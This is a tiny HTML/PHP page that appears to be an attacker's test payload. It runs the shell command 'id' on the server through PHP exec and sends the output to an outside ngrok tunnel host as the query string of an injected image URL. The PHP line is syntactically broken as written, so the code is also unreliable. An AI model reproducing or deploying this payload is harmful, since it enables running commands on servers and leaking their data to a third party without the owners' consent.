<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <?php
        $ip = echo exec('id');  
        ?>
        <script>
            var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+<?php echo $ip ?>;
    document.body.appendChild(img);
    </script>
 
    </body>
</html>
